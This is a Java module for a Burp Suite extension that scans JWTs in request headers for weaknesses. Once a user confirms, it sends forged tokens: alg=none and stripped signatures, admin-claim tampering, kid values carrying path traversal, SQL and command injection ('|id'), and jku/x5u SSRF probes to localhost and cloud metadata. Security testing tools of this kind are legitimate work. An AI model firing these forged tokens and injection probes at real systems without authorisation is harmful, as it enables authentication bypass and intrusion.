package icarus.modules;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.utilities.json.JsonNode;
import icarus.core.*;

import javax.swing.JCheckBox;
import javax.swing.JOptionPane;
import javax.swing.SwingUtilities;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.function.BiConsumer;
import java.util.function.Consumer;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public class JwtCheckerModule implements IcarusModule {

    private final MontoyaApi api;

    private static final Pattern JWT_REGEX = Pattern.compile("eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+(?:\\.[a-zA-Z0-9_-]*)?");

    public JwtCheckerModule(MontoyaApi api) {
        this.api = api;
    }

    @Override
    public String name() {
        return "JWT Checker";
    }

    @Override
    public List<Finding> run(HttpRequestResponse requestResponse, ModuleConfig config, Consumer<String> logger) {
        if (!config.getBool("jwt.enabled", true)) {
            return List.of();
        }

        var baseReq = requestResponse.request();
        var baseRes = requestResponse.response();

        if (baseRes == null) {
            return List.of();
        }

        List<Finding> findings = new ArrayList<>();
        List<JwtCandidate> jwtCandidates = new ArrayList<>();
        int globalCounter = 0;

        for (var h : baseReq.headers()) {
            String headerName = h.name();
            String headerValue = h.value();

            if (headerName.equalsIgnoreCase("Authorization") || headerName.equalsIgnoreCase("Cookie")) {
                var matcher = JWT_REGEX.matcher(headerValue);
                int perHeaderCounter = 0;

                while (matcher.find()) {
                    perHeaderCounter++;
                    globalCounter++;
                    jwtCandidates.add(new JwtCandidate(
                            matcher.group(),
                            headerName,
                            headerValue,
                            perHeaderCounter,
                            globalCounter
                    ));
                }
            }
        }

        if (jwtCandidates.isEmpty()) {
            return findings;
        }

        boolean jwtOverHttp = baseReq.url().startsWith("http://");
        if (jwtOverHttp) {
            findings.add(createFinding("JWT_OVER_HTTP", "JWT is being sent over HTTP", Severity.CRITICAL, requestResponse));
        }

        String hsts = getResHeader(requestResponse, "Strict-Transport-Security");
        if (hsts == null) {
            findings.add(createFinding("MISSING_HSTS", "Response does not include HSTS - relevant for token transport protection", Severity.MEDIUM, requestResponse));
        }

        boolean runActiveTests = confirmActiveTests();

        for (var candidate : jwtCandidates) {
            analyzeCandidate(candidate, baseReq, requestResponse, findings, config, runActiveTests, logger);
        }

        return findings;
    }

    /**
     * Asks the user before sending active tampering requests (privilege escalation, alg=none
     * bypass, SSRF probes, etc.) — the static/passive checks above always run regardless.
     * Mirrors RateLimitModule's per-project "don't ask again" pattern.
     */
    private boolean confirmActiveTests() {
        burp.api.montoya.persistence.PersistedObject extData = api.persistence().extensionData();
        String projPrefix = "jwt_" + api.project().name() + "_";

        Boolean remembered = extData.getBoolean(projPrefix + "active_tests_allowed");
        if (remembered != null) {
            return remembered;
        }

        boolean[] proceed = { false };
        boolean[] remember = { false };

        Runnable showDialog = () -> {
            JCheckBox chkRemember = new JCheckBox("Remember my choice for this project");
            Object[] message = {
                "JWT Checker is about to send ~20 tampered/forged token variants to this\n"
              + "target (privilege escalation, alg=none bypass, signature removal, SSRF\n"
              + "probes via jku/x5u, etc.) to actively test for authentication bypass.\n\n"
              + "Proceed with active tests?",
                chkRemember
            };
            int option = JOptionPane.showConfirmDialog(api.userInterface().swingUtils().suiteFrame(), message,
                    "JWT Checker — Active Tests", JOptionPane.YES_NO_OPTION, JOptionPane.WARNING_MESSAGE);
            proceed[0] = (option == JOptionPane.YES_OPTION);
            remember[0] = chkRemember.isSelected();
        };

        try {
            if (SwingUtilities.isEventDispatchThread()) {
                showDialog.run();
            } else {
                SwingUtilities.invokeAndWait(showDialog);
            }
        } catch (Exception e) {
            api.logging().logToError("Failed to show JWT active-test confirmation dialog: " + e);
            return false;
        }

        if (remember[0]) {
            extData.setBoolean(projPrefix + "active_tests_allowed", proceed[0]);
        }

        return proceed[0];
    }

    private void analyzeCandidate(JwtCandidate candidate, HttpRequest baseReq, HttpRequestResponse baseRR,
                                   List<Finding> findings, ModuleConfig config, boolean runActiveTests,
                                   Consumer<String> logger) {
        String token = candidate.token;
        var jwtParts = token.split("\\.", -1);
        if (jwtParts.length < 2) {
            return;
        }

        String headerPart = jwtParts[0];
        String payloadPart = jwtParts[1];
        String signaturePart = jwtParts.length > 2 ? jwtParts[2] : "";

        String decodedHeader = b64UrlDecodeToString(headerPart);
        String decodedPayload = b64UrlDecodeToString(payloadPart);

        if (decodedHeader == null || decodedPayload == null) {
            return;
        }

        JsonNode headerJson;
        JsonNode payloadJson;

        try {
            headerJson = JsonNode.jsonNode(decodedHeader);
            payloadJson = JsonNode.jsonNode(decodedPayload);
        } catch (Exception e) {
            return;
        }

        String algValue = null;
        String typValue = null;
        boolean hasJwkHeader = false;
        boolean hasJkuHeader = false;
        boolean hasKidHeader = false;
        boolean hasX5uHeader = false;
        boolean hasX5cHeader = false;

        if (headerJson.isObject()) {
            var hm = headerJson.asObject().asMap();
            if (hm.containsKey("alg")) algValue = nodeToSimpleString(hm.get("alg"));
            if (hm.containsKey("typ")) typValue = nodeToSimpleString(hm.get("typ"));
            hasJwkHeader = hm.containsKey("jwk");
            hasJkuHeader = hm.containsKey("jku");
            hasKidHeader = hm.containsKey("kid");
            hasX5uHeader = hm.containsKey("x5u");
            hasX5cHeader = hm.containsKey("x5c");
        }

        // Static Header Checks
        if (algValue == null) {
            findings.add(createFinding("MISSING_ALG", "JWT missing alg field in header", Severity.HIGH, baseRR));
        } else if ("none".equalsIgnoreCase(algValue)) {
            findings.add(createFinding("ALG_NONE", "JWT baseline uses alg=none", Severity.CRITICAL, baseRR));
        }

        if (algValue != null) {
            if (algValue.equalsIgnoreCase("HS256") || algValue.equalsIgnoreCase("HS384") || algValue.equalsIgnoreCase("HS512")) {
                findings.add(createFinding("WEAK_MAC", "JWT uses HMAC (" + algValue + ") - consider offline brute-forcing a weak secret", Severity.LOW, baseRR));
            } else if (algValue.equalsIgnoreCase("RS256") || algValue.equalsIgnoreCase("RS384") || algValue.equalsIgnoreCase("RS512")) {
                findings.add(createFinding("RSA_SIG", "JWT uses RSA (" + algValue + ") - test RS256->HS256 confusion if a public key is exposed", Severity.INFO, baseRR));
            } else if (algValue.equalsIgnoreCase("ES256") || algValue.equalsIgnoreCase("ES384") || algValue.equalsIgnoreCase("ES512")) {
                findings.add(createFinding("ECDSA_SIG", "JWT uses ECDSA (" + algValue + ") - validate library and implementation", Severity.INFO, baseRR));
            }
        }

        if (hasJwkHeader) findings.add(createFinding("EMBEDDED_JWK", "JWT header contains embedded jwk - potential key injection surface", Severity.HIGH, baseRR));
        if (hasJkuHeader) findings.add(createFinding("EMBEDDED_JKU", "JWT header contains jku - potential JWKS spoofing / SSRF surface", Severity.HIGH, baseRR));
        if (hasKidHeader) findings.add(createFinding("HAS_KID", "JWT header contains kid - test for path traversal, SQLi, or command injection", Severity.INFO, baseRR));
        if (hasX5uHeader) findings.add(createFinding("EMBEDDED_X5U", "JWT header contains x5u - potential SSRF / trusted key abuse surface", Severity.HIGH, baseRR));
        if (hasX5cHeader) findings.add(createFinding("EMBEDDED_X5C", "JWT header contains x5c - assess certificate injection / trust abuse", Severity.HIGH, baseRR));

        // Static Payload Checks
        boolean hasExp = false;
        boolean hasNbf = false;
        boolean hasIat = false;
        boolean hasAud = false;
        boolean hasIss = false;
        boolean hasJti = false;

        if (payloadJson.isObject()) {
            var pm = payloadJson.asObject().asMap();
            hasExp = pm.containsKey("exp");
            hasNbf = pm.containsKey("nbf");
            hasIat = pm.containsKey("iat");
            hasAud = pm.containsKey("aud");
            hasIss = pm.containsKey("iss");
            hasJti = pm.containsKey("jti");

            if (!hasExp) findings.add(createFinding("MISSING_EXP", "JWT missing exp claim", Severity.HIGH, baseRR));
            if (!hasIat) findings.add(createFinding("MISSING_IAT", "JWT missing iat claim", Severity.MEDIUM, baseRR));
            if (!hasNbf) findings.add(createFinding("MISSING_NBF", "JWT missing nbf - verify whether minimum validity window is enforced", Severity.LOW, baseRR));
            if (!hasAud) findings.add(createFinding("MISSING_AUD", "JWT missing aud - verify cross-service reuse", Severity.LOW, baseRR));
            if (!hasIss) findings.add(createFinding("MISSING_ISS", "JWT missing iss - verify issuer validation", Severity.LOW, baseRR));
            if (!hasJti) findings.add(createFinding("MISSING_JTI", "JWT missing jti - assess replay risk / lack of revocation", Severity.LOW, baseRR));

            for (String key : pm.keySet()) {
                String lowered = key.toLowerCase();
                String valuePreview = pm.get(key).toJsonString();

                if (lowered.contains("password") || lowered.contains("secret") || lowered.contains("apikey") ||
                    lowered.contains("api_key") || lowered.contains("token") || lowered.contains("hash")) {
                    boolean redact = config.getBool("jwt.redact_sensitive_claims", true);
                    String displayValue = redact ? "[REDACTED]" : valuePreview;
                    findings.add(createFinding("SENSITIVE_CLAIM", "Possible sensitive data in JWT claim: " + key + "=" + displayValue, Severity.HIGH, baseRR));
                }

                if (lowered.equals("role") || lowered.equals("roles") || lowered.equals("scope") || lowered.equals("scp") ||
                    lowered.equals("permissions") || lowered.equals("perm") || lowered.equals("isadmin") ||
                    lowered.equals("admin") || lowered.equals("tenant") || lowered.equals("tenant_id")) {
                    findings.add(createFinding("PRIVILEGED_CLAIM", "Privileged claim found: " + key + " - candidate for privilege escalation", Severity.INFO, baseRR));
                }
            }
        }

        if (!runActiveTests) {
            return;
        }

        // Active Tests
        BiConsumer<String, String> testToken = (label, tokenToSend) -> {
            if (Thread.currentThread().isInterrupted()) return;
            logger.accept("Testing " + humanizeLabel(label) + "...");
            try {
                String newHeaderValue = candidate.headerValue.replace(candidate.token, tokenToSend);
                HttpRequest mutatedReq = baseReq.withUpdatedHeader(candidate.headerName, newHeaderValue).withService(baseReq.httpService());

                if (mutatedReq.httpService() == null) return;

                // Tell AutoAuth to leave this request alone — we're deliberately sending
                // a tampered token and need it to arrive at the server as-is.
                icarus.autoauth.AutoAuthModule.BYPASS_INJECTION.set(true);
                HttpRequestResponse result;
                try {
                    result = api.http().sendRequest(mutatedReq);
                } finally {
                    icarus.autoauth.AutoAuthModule.BYPASS_INJECTION.set(false);
                }
                if (result.response() == null) return;

                int st = result.response().statusCode();
                String body = result.response().bodyToString();
                String lowerBody = body.toLowerCase();
                String verboseMatch = VerboseErrorDetector.getVerboseErrorMatch(body);
                boolean verbose = (verboseMatch != null);

                if (st < 400
                    && !lowerBody.contains("invalid token")
                    && !lowerBody.contains("jwt malformed")
                    && !lowerBody.contains("signature")
                    && !lowerBody.contains("unauthorized")
                    && !lowerBody.contains("forbidden")
                    && !lowerBody.contains("expired")) {
                    findings.add(createFinding("ACTIVE_HIT_" + label, "Active test HIT for " + label, Severity.HIGH, result));
                    logger.accept("[FINDING] worked (HTTP " + st + ")");
                } else if (verbose) {
                    findings.add(createFinding("VERBOSE_ERROR_" + label, "Active test triggered verbose error for " + label + ". Leak: " + verboseMatch, Severity.MEDIUM, result));
                    logger.accept("[FINDING] worked - verbose error leaked (HTTP " + st + ")");
                } else {
                    logger.accept("Not worked, returned " + st + ".");
                }
            } catch (Exception e) {
                api.logging().logToError("JWT Checker: active test '" + label + "' failed: " + e);
                logger.accept("request failed: " + e.getMessage());
            }
        };

        // 1) Signature not verified / claim tampering without resigning
        if (payloadJson.isObject()) {
            var pm = payloadJson.asObject().asMap();

            if (pm.containsKey("admin")) {
                var p = JsonNode.jsonNode(payloadJson.toJsonString());
                p.asObject().putBoolean("admin", true);
                testToken.accept("tamper-admin-without-resign", buildToken(decodedHeader, p, signaturePart));
            }

            if (pm.containsKey("isAdmin")) {
                var p = JsonNode.jsonNode(payloadJson.toJsonString());
                p.asObject().putBoolean("isAdmin", true);
                testToken.accept("tamper-isAdmin-without-resign", buildToken(decodedHeader, p, signaturePart));
            }

            if (pm.containsKey("role")) {
                var p = JsonNode.jsonNode(payloadJson.toJsonString());
                p.asObject().putString("role", "admin");
                testToken.accept("tamper-role-admin-without-resign", buildToken(decodedHeader, p, signaturePart));
            }

            if (pm.containsKey("scope")) {
                var p = JsonNode.jsonNode(payloadJson.toJsonString());
                p.asObject().putString("scope", "admin superuser root *");
                testToken.accept("tamper-scope-without-resign", buildToken(decodedHeader, p, signaturePart));
            }

            if (pm.containsKey("permissions")) {
                var p = JsonNode.jsonNode(payloadJson.toJsonString());
                p.asObject().putString("permissions", "[\"*\"]");
                testToken.accept("tamper-permissions-without-resign", buildToken(decodedHeader, p, signaturePart));
            }

            if (!pm.containsKey("role") && !pm.containsKey("admin") && !pm.containsKey("isAdmin")) {
                var p = JsonNode.jsonNode(payloadJson.toJsonString());
                p.asObject().putString("role", "admin");
                testToken.accept("inject-role-admin-without-resign", buildToken(decodedHeader, p, signaturePart));
            }
        }

        // 2) alg=none
        if (headerJson.isObject()) {
            var hNone = JsonNode.jsonNode(decodedHeader);
            hNone.asObject().putString("alg", "none");

            String noneHeader = hNone.toJsonString();
            String nonePayload = payloadJson.toJsonString();
            String noneToken = b64UrlEncode(noneHeader) + "." + b64UrlEncode(nonePayload) + ".";
            testToken.accept("alg-none-empty-signature", noneToken);

            String[] noneVariants = new String[]{"None", "NONE", "NoNe"};
            for (String variant : noneVariants) {
                var hv = JsonNode.jsonNode(decodedHeader);
                hv.asObject().putString("alg", variant);
                String tok = b64UrlEncode(hv.toJsonString()) + "." + b64UrlEncode(nonePayload) + ".";
                testToken.accept("alg-" + variant + "-empty-signature", tok);
            }
        }

        // 3) Remove signature entirely
        String noSigToken = headerPart + "." + payloadPart + ".";
        testToken.accept("remove-signature", noSigToken);

        // 4) Empty / junk signature
        String junkSigToken = headerPart + "." + payloadPart + ".AAAA";
        testToken.accept("junk-signature", junkSigToken);

        // 5) Time claim checks
        if (payloadJson.isObject()) {
            long now = Instant.now().getEpochSecond();

            if (hasExp) {
                var pExpPast = JsonNode.jsonNode(payloadJson.toJsonString());
                pExpPast.asObject().putNumber("exp", now - 86400);
                testToken.accept("expired-exp-claim", buildToken(decodedHeader, pExpPast, signaturePart));

                var pExpFar = JsonNode.jsonNode(payloadJson.toJsonString());
                pExpFar.asObject().putNumber("exp", now + 315360000L);
                testToken.accept("excessive-exp-10-years", buildToken(decodedHeader, pExpFar, signaturePart));
            } else {
                testToken.accept("missing-exp-claim-current-token-shape", buildToken(decodedHeader, payloadJson, signaturePart));
            }

            var pNbfFuture = JsonNode.jsonNode(payloadJson.toJsonString());
            pNbfFuture.asObject().putNumber("nbf", now + 86400);
            testToken.accept("future-nbf", buildToken(decodedHeader, pNbfFuture, signaturePart));

            var pIatFuture = JsonNode.jsonNode(payloadJson.toJsonString());
            pIatFuture.asObject().putNumber("iat", now + 86400);
            testToken.accept("future-iat", buildToken(decodedHeader, pIatFuture, signaturePart));
        }

        // 6) Audience / issuer / jti
        if (payloadJson.isObject()) {
            var pAud = JsonNode.jsonNode(payloadJson.toJsonString());
            pAud.asObject().putString("aud", "unexpected-service");
            testToken.accept("tamper-aud", buildToken(decodedHeader, pAud, signaturePart));

            var pIss = JsonNode.jsonNode(payloadJson.toJsonString());
            pIss.asObject().putString("iss", "https://attacker.invalid/");
            testToken.accept("tamper-iss", buildToken(decodedHeader, pIss, signaturePart));

            var pJti = JsonNode.jsonNode(payloadJson.toJsonString());
            pJti.asObject().putString("jti", "replay-test-fixed-jti");
            testToken.accept("tamper-jti-fixed-value", buildToken(decodedHeader, pJti, signaturePart));
        }

        // 7) Header abuse probes
        if (headerJson.isObject()) {
            var hKidTrav = JsonNode.jsonNode(decodedHeader);
            hKidTrav.asObject().putString("kid", "../../../../../../dev/null");
            testToken.accept("kid-path-traversal", buildRawToken(hKidTrav.toJsonString(), payloadJson.toJsonString(), signaturePart));

            var hKidSql = JsonNode.jsonNode(decodedHeader);
            hKidSql.asObject().putString("kid", "' OR '1'='1");
            testToken.accept("kid-sqli-probe", buildRawToken(hKidSql.toJsonString(), payloadJson.toJsonString(), signaturePart));

            var hKidCmd = JsonNode.jsonNode(decodedHeader);
            hKidCmd.asObject().putString("kid", "|id");
            testToken.accept("kid-command-injection-probe", buildRawToken(hKidCmd.toJsonString(), payloadJson.toJsonString(), signaturePart));

            var hJku = JsonNode.jsonNode(decodedHeader);
            hJku.asObject().putString("jku", "http://127.0.0.1:80/jwks.json");
            testToken.accept("jku-ssrf-probe-localhost", buildRawToken(hJku.toJsonString(), payloadJson.toJsonString(), signaturePart));

            var hX5u = JsonNode.jsonNode(decodedHeader);
            hX5u.asObject().putString("x5u", "http://169.254.169.254/latest/meta-data/");
            testToken.accept("x5u-ssrf-probe-imds", buildRawToken(hX5u.toJsonString(), payloadJson.toJsonString(), signaturePart));

            var hJwk = JsonNode.jsonNode(decodedHeader);
            hJwk.asObject().putString("jwk", "{\"kty\":\"RSA\",\"e\":\"AQAB\",\"n\":\"attacker\"}");
            testToken.accept("embedded-jwk-header-probe", buildRawToken(hJwk.toJsonString(), payloadJson.toJsonString(), signaturePart));

            var hX5c = JsonNode.jsonNode(decodedHeader);
            hX5c.asObject().putString("x5c", "[\"MIIBfakeattackercert\"]");
            testToken.accept("x5c-certificate-injection-probe", buildRawToken(hX5c.toJsonString(), payloadJson.toJsonString(), signaturePart));
        }

        // 8) RS256 -> HS256 structural probe
        if (algValue != null && algValue.equalsIgnoreCase("RS256")) {
            var hConf = JsonNode.jsonNode(decodedHeader);
            hConf.asObject().putString("alg", "HS256");
            testToken.accept("rs256-to-hs256-confusion-structural-probe", buildRawToken(hConf.toJsonString(), payloadJson.toJsonString(), signaturePart));
        }
    }

    private Finding createFinding(String type, String desc, Severity severity, HttpRequestResponse evidence) {
        return Finding.builder(name(), type)
                .description(desc)
                .severity(severity)
                .category(Category.JWT_WEAKNESS)
                .evidence(evidence)
                .build();
    }

    private static String buildToken(String headerStr, JsonNode payloadNode, String signaturePart) {
        return buildRawToken(headerStr, payloadNode.toJsonString(), signaturePart);
    }

    private static String buildRawToken(String headerStr, String payloadStr, String signaturePart) {
        return b64UrlEncode(headerStr) + "." + b64UrlEncode(payloadStr) + "." + signaturePart;
    }

    /** Turns a kebab-case test label like "future-nbf" or "alg-none-empty-signature" into readable log text. */
    private static String humanizeLabel(String label) {
        return label.replace('-', ' ');
    }

    private static String b64UrlEncode(String input) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(input.getBytes(StandardCharsets.UTF_8));
    }

    private static String b64UrlDecodeToString(String input) {
        try {
            String normalized = input.replace('-', '+').replace('_', '/');
            int padding = (4 - (normalized.length() % 4)) % 4;
            normalized = normalized + "=".repeat(padding);
            byte[] out = Base64.getDecoder().decode(normalized);
            return new String(out, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private static String nodeToSimpleString(JsonNode node) {
        if (node == null) return null;
        try {
            if (node.isString()) return node.asString();
            return node.toJsonString();
        } catch (Exception e) {
            return node.toJsonString();
        }
    }

    private static String getResHeader(HttpRequestResponse rr, String name) {
        for (var h : rr.response().headers()) {
            if (h.name().equalsIgnoreCase(name)) return h.value();
        }
        return null;
    }

    private static class JwtCandidate {
        final String token;
        final String headerName;
        final String headerValue;
        final int indexInHeader;
        final int globalIndex;

        JwtCandidate(String token, String headerName, String headerValue, int indexInHeader, int globalIndex) {
            this.token = token;
            this.headerName = headerName;
            this.headerValue = headerValue;
            this.indexInHeader = indexInHeader;
            this.globalIndex = globalIndex;
        }
    }
}
